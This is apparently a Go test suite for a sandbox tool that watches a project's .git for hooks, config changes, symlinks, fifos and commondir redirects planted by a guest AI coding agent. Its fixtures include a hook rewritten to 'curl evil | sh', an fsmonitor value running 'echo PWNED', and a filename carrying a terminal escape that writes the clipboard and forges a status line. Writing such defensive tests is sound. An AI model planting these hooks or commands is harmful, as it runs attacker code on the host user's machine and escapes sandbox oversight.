package wrap

import (
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"
)

// gitProject makes a project with the .git a fresh `git init` leaves behind
// that matters here: a config and an empty hooks directory. Built by hand so
// the tests do not need git on the machine running them.
func gitProject(t *testing.T) string {
	t.Helper()
	project := filepath.Join(t.TempDir(), "proj")
	if err := os.MkdirAll(filepath.Join(project, ".git", "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	writeFileT(t, filepath.Join(project, ".git", "config"), "[core]\n\tbare = false\n", 0o644)
	return project
}

func writeFileT(t *testing.T, name, content string, mode os.FileMode) {
	t.Helper()
	if err := os.WriteFile(name, []byte(content), mode); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(name, mode); err != nil {
		t.Fatal(err)
	}
}

// watchConfig is the part of a Config CheckProjectGit reads, with the
// warnings caught.
func watchConfig(project string) (*Config, *bytes.Buffer) {
	var errOut bytes.Buffer
	return &Config{Err: &errOut, Verbosity: Normal, VMName: "brig-claude-code", Project: project}, &errOut
}

// The case the warning exists for: a hook the guest plants is named on the
// next command, with what to do before git runs it. Said once: the command
// after that has nothing new to say.
func TestCheckProjectGitNamesAPlantedHook(t *testing.T) {
	isolateState(t)
	project := gitProject(t)
	c, errOut := watchConfig(project)

	c.CheckProjectGit()
	if errOut.Len() != 0 {
		t.Fatalf("the first look has nothing to compare against, so it says nothing: %q", errOut)
	}
	writeFileT(t, filepath.Join(project, ".git", "hooks", "post-checkout"), "#!/bin/sh\necho planted\n", 0o755)

	c.CheckProjectGit()
	got := errOut.String()
	for _, want := range []string{
		project + "/.git changed while brig-claude-code could write to it",
		"added .git/hooks/post-checkout",
		"runs these files as you",
		"git config --local --list",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("the warning does not say %q:\n%s", want, got)
		}
	}

	errOut.Reset()
	c.CheckProjectGit()
	if errOut.Len() != 0 {
		t.Errorf("a change already named is named again: %q", errOut)
	}
}

// core.fsmonitor is the one that runs before anything has been read, at the
// first git status. A config that changed is named.
func TestCheckProjectGitNamesAChangedConfig(t *testing.T) {
	isolateState(t)
	project := gitProject(t)
	c, errOut := watchConfig(project)
	c.CheckProjectGit()

	writeFileT(t, filepath.Join(project, ".git", "config"),
		"[core]\n\tbare = false\n\tfsmonitor = .git/fsmon.sh\n", 0o644)
	c.CheckProjectGit()
	if !strings.Contains(errOut.String(), "changed .git/config") {
		t.Errorf("the changed config is not named:\n%s", errOut)
	}
}

// git runs only an executable hook, so a sample made executable is as good as
// a new one, without a byte of it changing.
func TestCheckProjectGitNamesAHookMadeExecutable(t *testing.T) {
	isolateState(t)
	project := gitProject(t)
	hook := filepath.Join(project, ".git", "hooks", "pre-commit")
	writeFileT(t, hook, "#!/bin/sh\nexit 0\n", 0o644)
	c, errOut := watchConfig(project)
	c.CheckProjectGit()

	if err := os.Chmod(hook, 0o755); err != nil {
		t.Fatal(err)
	}
	c.CheckProjectGit()
	if !strings.Contains(errOut.String(), "changed .git/hooks/pre-commit") {
		t.Errorf("chmod +x on a hook is not named:\n%s", errOut)
	}
}

func TestCheckProjectGitSaysNothingWhenNothingChanged(t *testing.T) {
	isolateState(t)
	project := gitProject(t)
	// A change outside .git is the agent's ordinary work, and git diff shows
	// it already.
	c, errOut := watchConfig(project)
	c.CheckProjectGit()
	writeFileT(t, filepath.Join(project, "main.go"), "package main\n", 0o644)
	c.CheckProjectGit()
	if errOut.Len() != 0 {
		t.Errorf("nothing under .git changed, and brig warned: %q", errOut)
	}
}

// -q and --json silence warnings. A change they swallowed must reach the next
// command that can be heard, so the baseline stays where it was.
func TestCheckProjectGitKeepsTheBaselineWhileQuiet(t *testing.T) {
	isolateState(t)
	project := gitProject(t)
	c, errOut := watchConfig(project)
	c.CheckProjectGit()
	writeFileT(t, filepath.Join(project, ".git", "hooks", "post-merge"), "#!/bin/sh\n", 0o755)

	c.Verbosity = Quiet
	c.CheckProjectGit()
	if errOut.Len() != 0 {
		t.Fatalf("-q printed a warning: %q", errOut)
	}
	c.Verbosity = Normal
	c.CheckProjectGit()
	if !strings.Contains(errOut.String(), "added .git/hooks/post-merge") {
		t.Errorf("the change a quiet command saw was lost:\n%s", errOut)
	}
}

// brig reads these paths on the host, as the user, and the guest chose every
// one of them. A link is recorded by its target and never followed, so the
// host file it names is never read, and a hooks directory swapped for a link
// is named as the swap rather than walked as the directory it points at.
func TestCheckProjectGitDoesNotFollowALink(t *testing.T) {
	isolateState(t)
	project := gitProject(t)
	outside := t.TempDir()
	secret := filepath.Join(outside, "secret")
	writeFileT(t, secret, "host secret\n", 0o600)
	writeFileT(t, filepath.Join(outside, "post-checkout"), "#!/bin/sh\n", 0o755)
	c, errOut := watchConfig(project)
	c.CheckProjectGit()

	if err := os.Symlink(secret, filepath.Join(project, ".git", "hooks", "pre-push")); err != nil {
		t.Fatal(err)
	}
	c.CheckProjectGit()
	files := readIndex[gitWatchEntry](gitWatchIndexName)["brig-claude-code"].Files
	if got := files[".git/hooks/pre-push"]; got != "symlink to "+secret {
		t.Errorf("the link was not recorded as a link: %q", got)
	}
	if !strings.Contains(errOut.String(), "added .git/hooks/pre-push") {
		t.Errorf("the planted link is not named:\n%s", errOut)
	}

	errOut.Reset()
	hooks := filepath.Join(project, ".git", "hooks")
	if err := os.RemoveAll(hooks); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, hooks); err != nil {
		t.Fatal(err)
	}
	c.CheckProjectGit()
	files = readIndex[gitWatchEntry](gitWatchIndexName)["brig-claude-code"].Files
	if got := files[".git/hooks"]; got != "symlink to "+outside {
		t.Errorf("the swapped hooks directory was not recorded as a link: %q", got)
	}
	for name := range files {
		if strings.HasPrefix(name, ".git/hooks/") {
			t.Errorf("brig walked through the link into %s: %s", outside, name)
		}
	}
	if !strings.Contains(errOut.String(), "changed .git/hooks\n") {
		t.Errorf("the swapped hooks directory is not named:\n%s", errOut)
	}
}

// A read of a fifo waits for a writer that never comes. One planted in hooks
// is recorded as what it is, and the look finishes.
func TestCheckProjectGitDoesNotBlockOnAFifo(t *testing.T) {
	isolateState(t)
	project := gitProject(t)
	if err := syscall.Mkfifo(filepath.Join(project, ".git", "hooks", "post-checkout"), 0o644); err != nil {
		t.Skipf("no fifo here: %v", err)
	}
	c, _ := watchConfig(project)
	done := make(chan struct{})
	go func() {
		c.CheckProjectGit()
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(10 * time.Second):
		t.Fatal("the look blocked on a fifo in .git/hooks")
	}
	files := readIndex[gitWatchEntry](gitWatchIndexName)["brig-claude-code"].Files
	if got := files[".git/hooks/post-checkout"]; got != "named pipe (FIFO)" {
		t.Errorf("the fifo was recorded as %q", got)
	}
}

// A project that is not a repository yet becomes one the moment the guest
// writes a .git, and git on the host then runs what is in it.
func TestCheckProjectGitNamesAGitTheGuestCreated(t *testing.T) {
	isolateState(t)
	project := filepath.Join(t.TempDir(), "plain")
	if err := os.Mkdir(project, 0o755); err != nil {
		t.Fatal(err)
	}
	c, errOut := watchConfig(project)
	c.CheckProjectGit()

	if err := os.MkdirAll(filepath.Join(project, ".git", "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	writeFileT(t, filepath.Join(project, ".git", "hooks", "post-checkout"), "#!/bin/sh\n", 0o755)
	c.CheckProjectGit()
	if !strings.Contains(errOut.String(), "added .git/hooks/post-checkout") {
		t.Errorf("a .git the guest created is not named:\n%s", errOut)
	}
}

// A worktree's .git is a file pointing at the repository. The pointer is
// watched, and not followed.
func TestCheckProjectGitWatchesAGitFile(t *testing.T) {
	isolateState(t)
	project := filepath.Join(t.TempDir(), "wt")
	if err := os.Mkdir(project, 0o755); err != nil {
		t.Fatal(err)
	}
	writeFileT(t, filepath.Join(project, ".git"), "gitdir: /src/repo/.git/worktrees/wt\n", 0o644)
	c, errOut := watchConfig(project)
	c.CheckProjectGit()

	writeFileT(t, filepath.Join(project, ".git"), "gitdir: /tmp/elsewhere\n", 0o644)
	c.CheckProjectGit()
	if !strings.Contains(errOut.String(), "changed .git\n") {
		t.Errorf("a repointed .git file is not named:\n%s", errOut)
	}
}

// The project the sandbox had is the one its guest could write. A run that
// moves the session to another project names what changed in the old one.
func TestCheckProjectGitComparesTheProjectTheSandboxHad(t *testing.T) {
	isolateState(t)
	old, next := gitProject(t), gitProject(t)
	c, errOut := watchConfig(old)
	c.CheckProjectGit()
	writeFileT(t, filepath.Join(old, ".git", "hooks", "post-checkout"), "#!/bin/sh\n", 0o755)

	c.Project = next
	c.CheckProjectGit()
	if !strings.Contains(errOut.String(), old+"/.git changed") {
		t.Errorf("the change in the project the sandbox had is not named:\n%s", errOut)
	}
	if got := readIndex[gitWatchEntry](gitWatchIndexName)["brig-claude-code"].Project; got != next {
		t.Errorf("the next look is filed against %q, want the new project %q", got, next)
	}
}

// A project deleted since the last look has nothing left for git to run. The
// session moves on to its new project without a warning it cannot act on.
func TestCheckProjectGitForgetsAProjectThatIsGone(t *testing.T) {
	isolateState(t)
	old, next := gitProject(t), gitProject(t)
	c, errOut := watchConfig(old)
	c.CheckProjectGit()
	if err := os.RemoveAll(old); err != nil {
		t.Fatal(err)
	}

	c.Project = next
	c.CheckProjectGit()
	c.CheckProjectGit()
	if errOut.Len() != 0 {
		t.Errorf("a deleted project was warned about: %q", errOut)
	}
	if got := readIndex[gitWatchEntry](gitWatchIndexName)["brig-claude-code"].Project; got != next {
		t.Errorf("the look is filed against %q, want %q", got, next)
	}
}

// The same, for a session that stays on the project it remembers. Load drops
// the mount of a deleted project, so the look falls back to the remembered
// path, and the descent reads the missing directory as something moving it.
// That warning would read as tampering and repeat on every command.
func TestCheckProjectGitSaysNothingWhenTheRememberedProjectIsGone(t *testing.T) {
	isolateState(t)
	project := gitProject(t)
	c, errOut := watchConfig(project)
	c.CheckProjectGit()
	if err := os.RemoveAll(project); err != nil {
		t.Fatal(err)
	}

	c.Project = ""
	c.CheckProjectGit()
	c.CheckProjectGit()
	if errOut.Len() != 0 {
		t.Errorf("a deleted project was warned about: %q", errOut)
	}
	if _, ok := readIndex[gitWatchEntry](gitWatchIndexName)["brig-claude-code"]; ok {
		t.Error("the look at a deleted project was kept")
	}
}

// The guest chooses how much .git holds. A look hashes no more than its byte
// budget in all, whatever the count of files, and records the rest by mode
// and size, marking itself truncated.
func TestCheckProjectGitStopsHashingAtItsByteBudget(t *testing.T) {
	isolateState(t)
	saved := maxGitWatchBytes
	maxGitWatchBytes = 1000
	t.Cleanup(func() { maxGitWatchBytes = saved })
	project := gitProject(t)
	for _, name := range []string{"a", "b", "c"} {
		writeFileT(t, filepath.Join(project, ".git", "hooks", name), strings.Repeat("x", 600), 0o755)
	}

	files, err := snapshotProjectGit(project)
	if err != nil {
		t.Fatal(err)
	}
	if got := files[".git/hooks/c"]; got != "file 0755 600, not hashed" {
		t.Errorf("the file past the budget was recorded as %q", got)
	}
	if files[gitWatchTruncated] == "" {
		t.Error("a look that ran out of bytes is not marked truncated")
	}
	if got := files[".git/hooks/a"]; !strings.HasPrefix(got, "file 0755 600 ") || strings.Contains(got, "not hashed") {
		t.Errorf("the file inside the budget was not hashed: %q", got)
	}
	// b would fit only in part. A part would depend on the files before it.
	if got := files[".git/hooks/b"]; got != "file 0755 600, not hashed" {
		t.Errorf("the file the budget covers only in part was recorded as %q", got)
	}
}

// What a look records for a file depends on that file, not on how much of the
// budget the files before it spent. A guest that shrinks one hook does not get
// the untouched hook after it named as changed.
func TestCheckProjectGitNamesOnlyTheFileThatChangedPastTheBudget(t *testing.T) {
	isolateState(t)
	saved := maxGitWatchBytes
	maxGitWatchBytes = 1000
	t.Cleanup(func() { maxGitWatchBytes = saved })
	project := gitProject(t)
	hooks := filepath.Join(project, ".git", "hooks")
	writeFileT(t, filepath.Join(hooks, "a"), strings.Repeat("x", 620), 0o755)
	writeFileT(t, filepath.Join(hooks, "b"), strings.Repeat("y", 600), 0o755)
	c, errOut := watchConfig(project)
	c.CheckProjectGit()

	writeFileT(t, filepath.Join(hooks, "a"), strings.Repeat("x", 400), 0o755)
	c.CheckProjectGit()
	got := errOut.String()
	if !strings.Contains(got, "changed .git/hooks/a\n") {
		t.Errorf("the hook that shrank is not named:\n%s", got)
	}
	if strings.Contains(got, ".git/hooks/b") {
		t.Errorf("the untouched hook after it is named:\n%s", got)
	}
}

// The mark says whether any file went unhashed, wherever in the look that was.
// A budget that ends exactly at the last file leaves nothing unhashed, and one
// that runs out at the last file marks the look all the same.
func TestCheckProjectGitMarksTruncatedOnlyWhenAFileWentUnhashed(t *testing.T) {
	isolateState(t)
	saved := maxGitWatchBytes
	t.Cleanup(func() { maxGitWatchBytes = saved })
	project := gitProject(t)
	config := int64(len("[core]\n\tbare = false\n"))
	writeFileT(t, filepath.Join(project, ".git", "hooks", "a"), strings.Repeat("x", 600), 0o755)

	maxGitWatchBytes = config + 600
	files, err := snapshotProjectGit(project)
	if err != nil {
		t.Fatal(err)
	}
	if files[gitWatchTruncated] != "" {
		t.Errorf("a look whose budget covered every file is marked truncated: %v", files)
	}

	maxGitWatchBytes = config + 599
	files, err = snapshotProjectGit(project)
	if err != nil {
		t.Fatal(err)
	}
	if files[gitWatchTruncated] == "" || files[".git/hooks/a"] != "file 0755 600, not hashed" {
		t.Errorf("a look that could not hash its last file is not marked: %v", files)
	}
}

// A sandbox created again under a removed one's name starts over: comparing
// it against the removed one's look would name changes it never had.
func TestForgetSandboxDropsTheLookAtItsProject(t *testing.T) {
	isolateState(t)
	c, _ := watchConfig(gitProject(t))
	c.CheckProjectGit()
	other := &Config{Err: &bytes.Buffer{}, Verbosity: Normal, VMName: "brig-other", Project: gitProject(t)}
	other.CheckProjectGit()

	if _, err := ForgetSandbox("brig-claude-code"); err != nil {
		t.Fatal(err)
	}
	index := readIndex[gitWatchEntry](gitWatchIndexName)
	if _, ok := index["brig-claude-code"]; ok {
		t.Error("rm kept the look at the removed sandbox's project")
	}
	if _, ok := index["brig-other"]; !ok {
		t.Error("rm of one sandbox dropped another's look")
	}

	// ls leaves the looks alone: see TestLsKeepsTheLookAFirstRunTook.
	PruneSessions([]string{"brig-unrelated"})
	if _, ok := readIndex[gitWatchEntry](gitWatchIndexName)["brig-other"]; !ok {
		t.Error("ls dropped the look at a sandbox; only rm drops one")
	}
}

// run takes the look before the boot, and the runtime lists a sandbox only
// once it created it. An ls in between, while a first run still pulls its
// image, dropped that look, and the next command recorded whatever the guest
// had planted in the meantime with no warning.
func TestLsKeepsTheLookAFirstRunTook(t *testing.T) {
	isolateState(t)
	project := gitProject(t)
	c, errOut := watchConfig(project)
	c.CheckProjectGit()

	PruneSessions(nil)
	writeFileT(t, filepath.Join(project, ".git", "hooks", "post-checkout"), "#!/bin/sh\n", 0o755)
	c.CheckProjectGit()
	if !strings.Contains(errOut.String(), "added .git/hooks/post-checkout") {
		t.Errorf("a hook planted after an ls during the first run is not named:\n%s", errOut)
	}
}

// commondir points git at another directory for config, hooks and info, so
// the guest can change what git runs while the four watched paths stay as
// they were (the reproduction in #508). The commondir itself is named as
// added, and every look that finds one says so, including the first, which
// has nothing to compare against.
func TestCheckProjectGitNamesACommondir(t *testing.T) {
	isolateState(t)
	project := gitProject(t)
	c, errOut := watchConfig(project)
	c.CheckProjectGit()

	other := filepath.Join(project, ".git", "c")
	if err := os.Mkdir(other, 0o755); err != nil {
		t.Fatal(err)
	}
	writeFileT(t, filepath.Join(other, "config"), "[core]\n\tfsmonitor = \"echo PWNED >&2; false\"\n", 0o644)
	writeFileT(t, filepath.Join(project, ".git", "commondir"), "c\n", 0o644)
	c.CheckProjectGit()
	got := errOut.String()
	for _, want := range []string{"added .git/commondir", "has a commondir, so git reads its config and hooks from where that points", "cat .git/commondir"} {
		if !strings.Contains(got, want) {
			t.Errorf("the warning does not say %q:\n%s", want, got)
		}
	}

	// A sandbox first seen with a commondir already there.
	errOut.Reset()
	fresh := &Config{Err: errOut, Verbosity: Normal, VMName: "brig-fresh", Project: project}
	fresh.CheckProjectGit()
	if !strings.Contains(errOut.String(), "has a commondir") {
		t.Errorf("a commondir there at the first look is not named:\n%s", errOut)
	}
}

func TestCheckProjectGitSaysNothingOfACommondirThatIsNotThere(t *testing.T) {
	isolateState(t)
	c, errOut := watchConfig(gitProject(t))
	c.CheckProjectGit()
	c.CheckProjectGit()
	if strings.Contains(errOut.String(), "commondir") {
		t.Errorf("a repository with no commondir was warned about one:\n%s", errOut)
	}
}

// brig prints the names in the warning itself, so a name the guest chose
// reaches the host terminal unfiltered unless brig quotes it. This one writes
// the clipboard with OSC 52, then forges a line of brig's own.
func TestCheckProjectGitQuotesANameWithControlCharacters(t *testing.T) {
	isolateState(t)
	project := gitProject(t)
	c, errOut := watchConfig(project)
	c.CheckProjectGit()

	name := "x\x1b]52;c;cHduZWQ=\x07\nbrig: all good"
	writeFileT(t, filepath.Join(project, ".git", "hooks", name), "#!/bin/sh\n", 0o755)
	c.CheckProjectGit()
	got := errOut.String()
	if strings.ContainsAny(got, "\x1b\x07") {
		t.Errorf("a control character from a name reached the terminal: %q", got)
	}
	for _, line := range strings.Split(got, "\n") {
		if strings.TrimSpace(strings.TrimPrefix(line, "brig:")) == "all good" {
			t.Errorf("a name forged a line of brig's own: %q", got)
		}
	}
	if want := "added " + strconv.Quote(".git/hooks/"+name); !strings.Contains(got, want) {
		t.Errorf("the name is not shown quoted, want %s in:\n%s", want, got)
	}
}

func TestGuestTextQuotesOnlyWhatIsNotPrintable(t *testing.T) {
	for in, want := range map[string]string{
		".git/hooks/pre-commit":   ".git/hooks/pre-commit",
		".git/hooks/héllo":        ".git/hooks/héllo",
		".git/hooks/a b":          ".git/hooks/a b",
		".git/hooks/a\nb":         `".git/hooks/a\nb"`,
		".git/hooks/\x1b[2J":      `".git/hooks/\x1b[2J"`,
		".git/hooks/\u202eexe.sh": `".git/hooks/\u202eexe.sh"`,
		".git/hooks/\xff":         `".git/hooks/\xff"`,
	} {
		if got := guestText(in); got != want {
			t.Errorf("guestText(%q) = %s, want %s", in, got, want)
		}
	}
}

// A look reads a directory no further than its bound. fs.WalkDir read a whole
// .git/hooks before the bound applied, so 200k names there cost every command
// about a second while the look kept 4096 of them.
func TestCheckProjectGitReadsABigDirectoryOnlyToItsBound(t *testing.T) {
	isolateState(t)
	project := gitProject(t)
	hooks := filepath.Join(project, ".git", "hooks")
	const n = 5 * maxGitWatchEntries
	for i := 0; i < n; i++ {
		f, err := os.Create(filepath.Join(hooks, "h"+strconv.Itoa(i)))
		if err != nil {
			t.Fatal(err)
		}
		_ = f.Close()
	}
	batches := 0
	saved := gitWatchReadBatch
	gitWatchReadBatch = func() { batches++ }
	t.Cleanup(func() { gitWatchReadBatch = saved })

	files, err := snapshotProjectGit(project)
	if err != nil {
		t.Fatal(err)
	}
	if files[gitWatchTruncated] == "" {
		t.Error("a look past its bound is not marked truncated")
	}
	// The bound, a batch to see there is more, and a batch for each other
	// directory: info is not there, so hooks is the only one.
	if most := maxGitWatchEntries/gitWatchBatch + 2; batches > most {
		t.Errorf("read %d batches of %d for a bound of %d entries, want at most %d",
			batches, gitWatchBatch, maxGitWatchEntries, most)
	}
	if len(files) > maxGitWatchEntries+1 {
		t.Errorf("recorded %d entries past a bound of %d", len(files), maxGitWatchEntries)
	}
}

// What a look gives a directory's entries does not depend on the order the
// filesystem lists them in, so two looks at the same files record the same.
func TestCheckProjectGitLooksAtEntriesInNameOrder(t *testing.T) {
	isolateState(t)
	saved := maxGitWatchBytes
	maxGitWatchBytes = 700
	t.Cleanup(func() { maxGitWatchBytes = saved })
	project := gitProject(t)
	for _, name := range []string{"zz", "mm", "aa"} {
		writeFileT(t, filepath.Join(project, ".git", "hooks", name), strings.Repeat("x", 300), 0o755)
	}
	files, err := snapshotProjectGit(project)
	if err != nil {
		t.Fatal(err)
	}
	// config takes about 20 bytes of 700, aa and mm 300 each, and zz is past it.
	for name, hashed := range map[string]bool{"aa": true, "mm": true, "zz": false} {
		if got := !strings.Contains(files[".git/hooks/"+name], "not hashed"); got != hashed {
			t.Errorf("%s hashed %v, want %v: %q", name, got, hashed, files[".git/hooks/"+name])
		}
	}
}

func needGit(t *testing.T) {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git here")
	}
}

// husky points core.hooksPath at .husky/_ and ignores everything in it, so a
// hook the guest edits there is shown neither by git status nor, until now, by
// the warning, and git runs it at the next commit.
func TestCheckProjectGitWatchesAHooksPathInTheProject(t *testing.T) {
	needGit(t)
	isolateState(t)
	project := gitProject(t)
	writeFileT(t, filepath.Join(project, ".git", "config"), "[core]\n\tbare = false\n\thooksPath = .husky/_\n", 0o644)
	husky := filepath.Join(project, ".husky", "_")
	if err := os.MkdirAll(husky, 0o755); err != nil {
		t.Fatal(err)
	}
	writeFileT(t, filepath.Join(husky, ".gitignore"), "*\n", 0o644)
	writeFileT(t, filepath.Join(husky, "pre-commit"), "#!/bin/sh\nnpx lint-staged\n", 0o755)
	c, errOut := watchConfig(project)
	c.CheckProjectGit()

	writeFileT(t, filepath.Join(husky, "pre-commit"), "#!/bin/sh\ncurl evil | sh\n", 0o755)
	c.CheckProjectGit()
	if !strings.Contains(errOut.String(), "changed .husky/_/pre-commit") {
		t.Errorf("an edited hook under core.hooksPath is not named:\n%s", errOut)
	}
}

// A hooksPath that leads out of the project is not the guest's to write, and
// is not read: the look stays inside the project.
func TestCheckProjectGitDoesNotReadAHooksPathOutsideTheProject(t *testing.T) {
	needGit(t)
	isolateState(t)
	outside := t.TempDir()
	writeFileT(t, filepath.Join(outside, "pre-commit"), "#!/bin/sh\n", 0o755)
	for _, hooksPath := range []string{outside, "../" + filepath.Base(outside), "../../.."} {
		project := gitProject(t)
		writeFileT(t, filepath.Join(project, ".git", "config"), "[core]\n\thooksPath = "+hooksPath+"\n", 0o644)
		files, err := snapshotProjectGit(project)
		if err != nil {
			t.Fatal(err)
		}
		for name := range files {
			if !strings.HasPrefix(name, ".git") {
				t.Errorf("hooksPath %q: the look recorded %s, outside .git", hooksPath, name)
			}
		}
	}
}

// git config would read any file an include.path names, and the guest names
// it. Includes are off, so a hooksPath set only through one is not seen, and
// nothing outside .git/config is read to find it.
func TestHooksPathIsReadWithIncludesOff(t *testing.T) {
	needGit(t)
	project := gitProject(t)
	included := filepath.Join(t.TempDir(), "extra")
	writeFileT(t, included, "[core]\n\thooksPath = .husky/_\n", 0o644)
	writeFileT(t, filepath.Join(project, ".git", "config"), "[include]\n\tpath = "+included+"\n", 0o644)
	git, err := os.OpenRoot(filepath.Join(project, ".git"))
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = git.Close() }()
	if rel, ok := hooksPathInProject(git, project); ok {
		t.Errorf("a hooksPath from an included file was followed: %q", rel)
	}
}

// With no git there is nothing to parse the config with, and git on the host
// could not run a hook either. The look goes on without it.
func TestCheckProjectGitGoesOnWithoutGit(t *testing.T) {
	isolateState(t)
	project := gitProject(t)
	writeFileT(t, filepath.Join(project, ".git", "config"), "[core]\n\thooksPath = .husky/_\n", 0o644)
	t.Setenv("PATH", t.TempDir())
	files, err := snapshotProjectGit(project)
	if err != nil {
		t.Fatalf("the look failed without git: %v", err)
	}
	if files[".git/config"] == "" {
		t.Error("the look without git recorded no config")
	}
}

// The walk saw a regular file, and the guest swaps it for a fifo before the
// open. A read of a fifo waits for a writer that never comes, so the look has
// to see what it opened and leave it unread, and finish.
func TestCheckProjectGitDoesNotBlockOnAFifoSwappedInBeforeTheOpen(t *testing.T) {
	isolateState(t)
	project := gitProject(t)
	hook := filepath.Join(project, ".git", "hooks", "post-checkout")
	writeFileT(t, hook, "#!/bin/sh\n", 0o755)
	saved := gitWatchBeforeOpen
	gitWatchBeforeOpen = func(name string) {
		if name != "hooks/post-checkout" {
			return
		}
		if err := os.Remove(hook); err != nil {
			t.Error(err)
		}
		if err := syscall.Mkfifo(hook, 0o644); err != nil {
			t.Error(err)
		}
	}
	t.Cleanup(func() { gitWatchBeforeOpen = saved })

	done := make(chan map[string]string, 1)
	go func() {
		files, err := snapshotProjectGit(project)
		if err != nil {
			t.Error(err)
		}
		done <- files
	}()
	select {
	case files := <-done:
		if got := files[".git/hooks/post-checkout"]; !strings.HasPrefix(got, "replaced while brig read it") {
			t.Errorf("the swapped-in fifo was recorded as %q", got)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("the look blocked on a fifo swapped in before the open")
	}
}
